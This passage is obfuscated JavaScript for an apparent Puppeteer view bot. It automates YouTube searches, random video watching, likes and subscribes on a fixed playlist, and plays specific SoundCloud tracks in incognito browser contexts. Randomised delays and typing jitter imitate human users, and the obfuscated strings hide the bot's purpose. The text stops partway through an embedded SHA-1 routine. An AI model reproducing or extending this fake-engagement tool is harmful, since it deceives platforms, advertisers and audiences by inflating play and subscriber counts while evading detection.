const Z = b,
  Y = d,
  X = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x1980 + 0x1d46 * 0x1 + 0x36c5 * -0x1))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1 * -0x269 + 0x1 * 0x14f0 + -0x1759), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x1 * -0x74dd + -0x5cee + 0x5d41 + (0x2b * -0x227 + -0x16f9 * 0x2 + -0x276b * -0x5) * random()) : await standardWaitForNetIdle(f), await wait(0x407 + 0x22f6 + 0x11 * -0x125 + (0x1 * 0xce7 + 0x19 * 0x1e5 + 0x5c * -0x3b) * random()), 0x163 + 0x31d * 0x1 + 0x47f * -0x1;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x6 * 0x47b + 0x18ef + -0xac3 * 0x3), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1f69 * 0x1 + -0x2609 + -0x305 * -0x17;
}
async function randomWait() {
  return await wait(0x209 * 0x11 + 0x1fff * 0x1 + 0x3 * -0xfb0 + (0x683 * -0x5 + -0x13e9 + 0x9 * 0x800) * random()), -0x2687 + 0x232e + -0x35a * -0x1;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = c;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + R(0xd) + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0xa59 + 0x67 * 0x3a + -0x21af, 0xdea + 0x30 * -0xa0 + 0x101d), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x3e75 + -0x9dc0 + 0x1c695) * getRandomInt(-0x20d0 + -0x4d0 + 0x25a2 * 0x1, 0x2 * 0x48e + 0x4e4 * -0x4 + 0xa79), h)), -0x898 + 0x1714 + -0xe7b;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0xcb1 * 0x3 + 0x266 * -0x7 + 0x36dd;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x127a + -0x59e * -0x4 + -0x3fd]['split']('\x20');
    for (let k = -0x116c + 0x1339 + 0x1 * -0x1cd; k < i['length']; k += 0x2314 + 0x22e4 + 0x7c6 * -0x9)
      j += i[k] * h[i[k + (0x7f * -0x1f + -0x16e2 + 0x1f * 0x13c)]];
    return j;
  });
}

function a() {
  const bl = [
    'y2XVC2u',
    'emoOW6JcTCkpW5pcOffOW68',
    'z25PDg9cCM93CW',
    'lw91CI1YzxbSyq',
    'lSo4uCkkW5W3WQqWWQddHq',
    'WQlcPs9Rj8kGkMxdQdW',
    'wMrSCLzeD25Fyq',
    'finalize',
    'tdS/W4FdKCofmJxdVIW',
    ',bts\x20play\x20',
    'Bw9VlMLVigHHyW',
    'W60qtJZdGgddNCoYWO/cQG',
    'zc1ZA2LWlwfKlq',
    'BwfNzs0Ty29UDa',
    'CgXtExjiCvvOnW',
    'BgvUz3rO',
    'hash',
    'lwr1BMuTBw9Klq',
    'amoYw3WoW6ZdS8krW5VdMG',
    '\x20(KHTML,\x20l',
    'CMCVzw4VC2nYAq',
    'rg/en/scri',
    'lSoOW5FcG8kqW4xcOXftW4G',
    '4ud3ZPfWkH',
    'tle__playB',
    'etter-prog'
  ];
  a = function() {
    return bl;
  };
  return a();
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x1171 + 0x8f8 + -0x547 * 0x5)['map'](l => Array['from'](l['children']))['flat'](0x2dc + 0xfe5 + -0x12c0)['map'](l => l['childNodes'][-0x36e * 0x2 + -0xe68 + 0x1545]['childNodes'][-0x9d7 * 0x3 + -0x3 * -0x81 + 0x1c02]['childNodes'][0x1999 + 0x507 * 0x3 + -0x28ad]['childNodes'][0x1083 * -0x2 + -0x41 + 0x2147]['childNodes'][-0x42 * -0x29 + -0x1 * -0x24be + -0x2f4f]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1b61 + -0x24c5 + -0x1 * -0x440e, -0xe6 + -0x4ee * 0x4 + 0x2826)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x33 * -0x6b + -0x1 * -0x42bc + 0xd2d * 0x1);
  const h = await getMaxTime(f),
    i = Math['min']((-0x4bda + -0xf67e * 0x1 + 0x22cb8 * 0x1) * getRandomInt(0x807 + 0x6d2 + -0xed7, 0x2018 * -0x1 + -0x80 * -0x1b + 0x129d), h);
  return await wait(i), 0xa61 + 0x2 * -0x3fd + -0x266;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1e8e + -0x7d2 + -0x16bc]['children'][-0x2033 + 0x3d * -0x9e + -0x45d9 * -0x1]['children'][-0x17c8 + -0x65 * 0x49 + -0x783 * -0x7]['children'][-0x1b60 * 0x1 + 0x1a4c + 0x6 * 0x2e]['children'][-0xd * -0xe3 + 0x112d + -0x1cb4]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1d * -0xa6 + 0x1b4d + -0x170d * 0x2;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x91b * 0x4 + 0xf58 * 0x2 + -0xe0 * -0x7 + (-0x1 * -0x4d + 0x2186 + 0x1 * -0x21a1) * random()
  }), await wait(0x246 * 0x3 + 0x164c + -0x1b2a + (-0x10ad + -0x4 * 0x2ef + -0x1 * -0x1d95) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x1 * 0xcca + 0x9d * 0x27 + -0x3 * 0x3b5]['childNodes'][-0x10e5 + 0x3a + 0x184 * 0xb]['childNodes'][0xd * -0x1d3 + -0x15 * -0x25 + 0x14af]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1d9c + 0x1 * 0x15e3 + -0x7be * -0x1]['childNodes'][0xa * 0x1eb + 0x14e7 + -0x1 * 0x2815]['childNodes'][0x7 * -0x2a2 + -0x9a3 * 0x1 + 0x1c13 * 0x1]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x5 * 0x556 + 0x2143 + -0x694),
          r = -0x16 * 0x98 + -0x1 * 0x10f1 + 0x1e01;
        for (let u = -0x4 * -0x3eb + -0x1f0d + 0xf61; u < q['length']; u += -0x3 * -0x66c + -0x9cf + -0x3b * 0x29)
          r += q[u] * k[q[u + (-0x182c + 0x83 + 0x17aa)]];
        return r;
      }(n);
  });
  await wait((-0x4d95 * 0x1 + -0x6e6e + 0x1 * 0xf69b) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x39 * 0xba + -0x3118 * -0x1 + -0x5 * -0x1cc6) * getRandomInt(0x37 * -0xe + 0x1a3 * -0x11 + 0x1ed6 * 0x1, 0x84 * -0x43 + 0x37e + -0x3e3 * -0x8), h + (0x4 * -0x1b5 + 0x241e + -0x2 * 0x4e1));
  return await wait(i), -0x17b7 + 0x1123 + 0x695;
}
async function keyWatch(f) {
  const S = b;
  log('standard\x20k' + S(0x8, 'aVUN')), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x589 * -0x1 + 0x1 * 0x1a93 + -0x201c), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x1f * -0xbf + 0x8ca + -0x1433 + (-0x1332 + -0x3d * 0x6 + 0x1888) * Math['random']());
    });
  }, -0x693 + 0x2d5 * -0x3 + 0x2a6a);
  await wait(0x32a4b + -0x481fa + -0x24f7 * -0x29);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x60ee * -0x2 + -0xc2fb + -0x1 * -0xeb7f) * getRandomInt(-0x2627 + -0x3 * 0xa4 + 0xb * 0x3a5, -0x59 * 0x58 + -0x1381 * -0x1 + 0xb30)), clearInterval(h), 0x1c7a + -0xca * 0x15 + 0xbe7 * -0x1;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1 * -0xd83 + -0x1faf + 0x2 * 0x916;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x116 * 0x17 + 0x1ef7 + 0x166 * -0x28;
    await randomWait();
  }
  return -0x6b5 + -0x6cc + 0xd82;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x2373 + 0x5 * 0x2 + 0x237d * -0x1);
    let h = e[f];
    if (c['qYuIlp'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0xe83 + 0x2fe * -0x3 + -0x1 * 0x589, r, s, t = -0x26dd + -0x3d7 + 0xaad * 0x4; s = m['charAt'](t++); ~s && (r = q % (0x11 * -0x1b4 + 0x1 * 0x3ad + 0x19 * 0x103) ? r * (-0x10 * 0xa + -0x1d * -0x6c + -0x2 * 0x5ae) + s : s, q++ % (-0x31b + -0x124c + 0x1 * 0x156b)) ? o += String['fromCharCode'](-0x33b * -0x3 + 0xd40 * -0x2 + 0x11ce & r >> (-(0x3 * -0xba9 + 0xe9 * 0x22 + 0x9 * 0x73) * q & 0x1 * 0xa6d + -0x1069 * -0x1 + 0x8f0 * -0x3)) : 0x23b * 0x11 + 0x1 * 0x267d + -0x4c68) {
          s = n['indexOf'](s);
        }
        for (let u = 0x6e5 + -0x247b + -0x1d96 * -0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1965 + 0x306 * 0x8 + 0x19 * 0xd))['slice'](-(0x1 * 0x1a6f + 0x2403 + -0x3e70));
        }
        return decodeURIComponent(p);
      };
      c['HfAfZh'] = i, b = arguments, c['qYuIlp'] = !![];
    }
    const j = e[0x275 + 0x1 * 0x1b1f + -0x1d94],
      k = f + j,
      l = b[k];
    return !l ? (h = c['HfAfZh'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x2373 + 0x5 * 0x2 + 0x237d * -0x1);
    let h = e[f];
    if (b['nlcscv'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0xe83 + 0x2fe * -0x3 + -0x1 * 0x589, s, t, u = -0x26dd + -0x3d7 + 0xaad * 0x4; t = n['charAt'](u++); ~t && (s = r % (0x11 * -0x1b4 + 0x1 * 0x3ad + 0x19 * 0x103) ? s * (-0x10 * 0xa + -0x1d * -0x6c + -0x2 * 0x5ae) + t : t, r++ % (-0x31b + -0x124c + 0x1 * 0x156b)) ? p += String['fromCharCode'](-0x33b * -0x3 + 0xd40 * -0x2 + 0x11ce & s >> (-(0x3 * -0xba9 + 0xe9 * 0x22 + 0x9 * 0x73) * r & 0x1 * 0xa6d + -0x1069 * -0x1 + 0x8f0 * -0x3)) : 0x23b * 0x11 + 0x1 * 0x267d + -0x4c68) {
          t = o['indexOf'](t);
        }
        for (let v = 0x6e5 + -0x247b + -0x1d96 * -0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1965 + 0x306 * 0x8 + 0x19 * 0xd))['slice'](-(0x1 * 0x1a6f + 0x2403 + -0x3e70));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x275 + 0x1 * 0x1b1f + -0x1d94,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x232e + -0x11ca * 0x1 + 0x9f * -0x1c; u < -0x1 * 0x1d23 + -0xff3 * -0x1 + 0xe30; u++) {
          p[u] = u;
        }
        for (u = 0x1a38 + 0x108b + -0x2ac3; u < -0x88a + -0x30d + 0xc97; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x61a * -0x1 + -0x4a3 * 0x8 + 0x1 * 0x2c32), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1849 + 0x1db5 + -0x1aff * 0x2, q = -0x24ac + -0xd55 + -0x3201 * -0x1;
        for (let v = 0x25fb + 0x198a + -0xa1 * 0x65; v < n['length']; v++) {
          u = (u + (0x1cc4 + -0x19b4 + -0x9 * 0x57)) % (0x36 * -0x1 + -0x2 * -0xfae + -0x1e26), q = (q + p[u]) % (0x1855 + 0x1ea5 + 0x126 * -0x2f), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0xd * -0x185 + -0x18 * -0x146 + -0x9cf)]);
        }
        return t;
      };
      b['jIwYWS'] = m, c = arguments, b['nlcscv'] = !![];
    }
    const j = e[0x5 * 0x779 + -0x2176 + -0x3e7],
      k = f + j,
      l = c[k];
    return !l ? (b['MIswHt'] === undefined && (b['MIswHt'] = !![]), h = b['jIwYWS'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function fetchRandomSC() {
  return Math['random']() <= -0x21b * 0x4 + -0x1f * -0xff + -0x1 * 0x1675 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x1099 * 0x1 + 0xf70 + -0x3b * 0x8b + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x2373 + 0x5 * 0x2 + 0x237d * -0x1);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function runGFModule(f, h) {
  async function i() {
    const U = c;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x10d4 + -0x2675 + 0x3749 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x1 * -0x11b7 + 0xa1 * -0x4 + 0x143b;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const T = d;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + T(0x18) + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x2 * -0x2129 + 0xfe6e * -0x1 + 0x5af9 * 0x4 + getRandomInt(-0x1 * -0x2e4d + 0x2feb + -0x23a0, -0xc27b + 0x1f31 * -0x1 + 0x2 * 0xab6e));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1c * -0x6b + -0x261b * -0x1 + -0x33 * 0xfa), r = await f['createInco' + U(0x2) + 'erContext'](), s = await r['newPage']();
      let u = 0x3 * -0x7d + -0xa67 * 0x1 + 0x62 * 0x1f;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x4ed + -0x1f11 + 0x11ff * 0x2, 0xedb + 0x5bf * -0x1 + -0x8ea)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x5c2 + 0x1 * -0x228d + 0x301f * 0x1 + floor((0x2f * 0xce + -0x114 * -0x1f + -0x3f6 * 0x11) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x5 * -0x197a3bb6 + -0x1d8fa84e + 0x11cf2d2dc),
          0x6f506a + -0xa004c5 + 0xb0b45b,
          -0x39 * 0x2 + 0xa60c + -0x259a,
          -0x500 + -0x206f + 0x25ef
        ], y = [
          -0xb99 * -0x3 + -0x1 * -0x2417 + 0x572 * -0xd,
          -0xb6c + -0x1c * -0x13d + -0x1730,
          -0x1 * -0x17b + 0x26ea + -0x285d,
          -0x22e3 + 0xa0d + 0x18d6
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0xd * 0x21a + 0x121d * -0x1 + -0x934)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x1a52 + 0x1a94 * -0x1 + 0x34e6; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x13ac + 0xb * -0xde + -0xe9b * -0x2) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x100 + 0xa6a * 0x1 + -0x96a] = A[0x2287 + 0x41 * 0xb + -0x2542] = A[-0x1 * 0x2a1 + -0x1084 + 0x2b * 0x72] = A[0x179a + 0x8f9 * -0x1 + -0xe9f] = A[0x16e6 + -0x31d + 0x9e3 * -0x2] = A[0x247f + 0x56 * 0xb + 0x11 * -0x25d] = A[-0x1ef9 + 0xe5 * -0x1 + 0x1 * 0x1fe3] = A[-0x7c6 + 0x23b1 + -0x1be5] = A[0x362 * 0x3 + -0x1650 + 0xc31] = A[0x2218 + -0x2559 + 0x349] = A[0x517 * 0x5 + 0x4 * -0x577 + -0x46 * 0xd] = A[0xedb + -0x24b7 + 0x15e6] = A[0x2 * 0x823 + -0x34b + 0x6 * -0x228] = A[0x1 * 0x413 + 0xaad * 0x1 + -0x1 * 0xeb4] = A[-0x1 * 0x1b0e + 0x1 * -0x19a6 + 0x34c1] = A[0x1e82 * 0x1 + 0xfdb + -0x2e4f] = A[-0x809 + 0x32b * -0x2 + -0x2 * -0x737] = 0xf28 + 0x5c3 * 0x2 + -0x1aae, this['blocks'] = A) : this['blocks'] = [
                0x578 + -0x16d9 * 0x1 + 0x1 * 0x1161,
                -0x65 * 0x4f + -0x2302 + 0x3 * 0x160f,
                0x3d * -0x86 + -0x1944 + 0x3932,
                0x24c6 + -0x2355 + -0x171,
                0xc57 + -0x1a4f + 0xdf8,
                0xb * -0x35b + -0x589 * -0x2 + 0x19d7,
                -0x1064 + 0x1911 * -0x1 + -0x2975 * -0x1,
                -0x190e + -0x1b9a + 0x34a8,
                0x1b37 + -0x39 * 0x16 + 0xc5 * -0x1d,
                -0x1 * -0x10b1 + 0x14b * -0x8 + -0x659,
                0xd8f + 0x4a * -0x20 + -0x44f,
                0x1e80 + 0x11fa * -0x2 + 0x574,
                -0x5 * -0x584 + 0x39 * 0x26 + -0x240a,
                0x1454 + -0x12 * -0xec + -0x11 * 0x22c,
                0xca1 + -0x68e + -0x613,
                -0xeb * -0x13 + -0x4cb + -0xca6,
                -0x47 * -0x7c + -0x2566 + -0x6e * -0x7
              ], this['h0'] = 0x5a2c75 * 0x143 + -0x3069a5d8 + 0x7 * 0x56a6276, this['h1'] = 0x9544ff * -0xd7 + -0x4c4ff349 + -0x1 * -0x1b97a90fb, this['h2'] = 0x158d7991 * 0xa + -0x1 * 0x4d2890a7 + -0x1d69d7 * -0x7d, this['h3'] = 0x1 * 0x43546df + 0xf * 0x100c8e1 + 0x2 * -0x1875bcc, this['h4'] = 0x1513254b7 * -0x1 + 0xd243634e + -0x5 * -0x408d2a45, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0xbef + -0x1d04 + 0x1 * 0x1115, this['finalized'] = this['hashed'] = -0x1541 * 0x1 + 0x116 * -0xa + 0x201d, this['first'] = 0x19 * -0x9b + -0x2 * 0x851 + -0x2 * -0xfe3;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x31 * -0x74 + 0x1b7 * 0xd + -0x1 * 0x17, O = J['length'] || 0x122c + -0x257c + -0x4d4 * -0x4, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x3c9 * -0x7 + 0x3a9 + 0xa * -0x304, P[0x4 * 0x7f3 + 0x7c8 + -0x2794] = this['block'], P[0x170b + 0x14f8 + -0x2bf3 * 0x1] = P[-0x1 * 0x1c96 + -0x19a8 + 0x363f] = P[0x79 * 0x1f + -0x3 * -0x10d + 0x1 * -0x11cc] = P[-0x1 * 0x2269 + -0x1711 * 0x1 + 0x397d * 0x1] = P[-0x416 + -0x188c * 0x1 + 0x1ca6] = P[-0x1 * -0x1fde + 0x434 * 0x2 + 0xf * -0x2af] = P[-0x9e * 0x22 + 0x127f * 0x2 + -0xffc] = P[-0x8da + 0x264a + -0x1d69] = P[0x9 * 0x1d1 + -0xb * 0x51 + 0x2 * -0x66b] = P[0x137e + -0x7b * -0x36 + -0x2d67] = P[-0xee0 + 0x121b + -0x331 * 0x1] = P[-0x3b7 + -0x19bd + -0x9 * -0x347] = P[0x22c8 + -0x332 * -0x4 + -0x2f84] = P[-0x261e + -0x12af + 0x38da] = P[-0x2 * -0xffd + 0x13b3 + -0x339f] = P[0x21bf + -0x59 * 0x61 + 0x1 * 0x9] = -0x32 * 0x76 + -0x4 * -0x634 + -0x1 * 0x1c4), K) {
                    for (N = this['start']; M < O && N < -0x277 + -0x1bdf + 0xf4b * 0x2; ++M)
                      P[N >> 0x1cf1 + 0x26d2 + -0x43c1] |= J[M] << y[0x1c2a + 0xb7 * -0x34 + 0x905 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x2673 + -0x13a * 0x17 + 0x7 * 0x98f; ++M)
                      (L = J['charCodeAt'](M)) < -0x40 + 0x54e * -0x7 + -0x1 * -0x25e2 ? P[N >> 0x17d * 0x13 + -0x22fb + 0x6b6] |= L << y[-0xf3 * -0x1 + 0x1253 + -0x1343 & N++] : L < -0x3 * 0x75d + -0x120 * 0x17 + -0x1 * -0x37f7 ? (P[N >> -0x23e1 + 0xe * -0x23b + 0x1 * 0x431d] |= (-0x251 * -0x1 + -0xde1 + 0x4 * 0x314 | L >> -0x22f5 + 0x65 * -0xd + 0x281c) << y[0x1959 + -0x13b2 * -0x1 + 0x106 * -0x2c & N++], P[N >> 0xbde + -0x26fc + -0x7c * -0x38] |= (-0x1b * 0x97 + 0x1c6c + -0xbff | -0x1a14 + -0x1dbd + 0x3810 & L) << y[-0x1de2 + -0x1234 + 0x3019 & N++]) : L < 0x1f1 * 0x95 + 0x6ef + -0x5034 || L >= 0x1e20 + 0x8d7d * -0x1 + 0x14f5d ? (P[N >> 0x6b5 * 0x4 + -0x64b * -0x5 + -0x15b * 0x2b] |= (0x6 * -0x412 + 0x2c7 + 0x1685 | L >> 0xc33 + 0x1dde + -0x2a05) << y[-0xc4e + 0x1623 + -0x9d2 & N++], P[N >> 0x6c7 + 0x1a29 + -0x20ee] |= (-0x2 * 0xa91 + 0x242c + -0xe8a | L >> -0x14 * 0x16c + 0xdb8 + 0xebe & 0x3 * 0xcff + 0x78e * -0x3 + -0x157 * 0xc) << y[-0x1e9a + -0x11fa + 0x7 * 0x6f1 & N++], P[N >> 0xc * 0x1f6 + 0x2685 + -0x3e0b] |= (-0x2373 + -0x1 * 0x661 + -0x2a * -0x102 | -0x5 * 0x550 + -0x4 * 0x869 + 0x3c73 & L) << y[-0x222e + 0x2140 + -0x1 * -0xf1 & N++]) : (L = -0x4 * -0x6aec + 0xaafe + -0x156ae + ((-0x4d * -0x67 + 0x106b + -0x2b67 & L) << -0x104e + -0x172a + 0x2782 | -0x14ac + 0x7c + 0x1 * 0x182f & J['charCodeAt'](++M)), P[N >> 0xc09 + 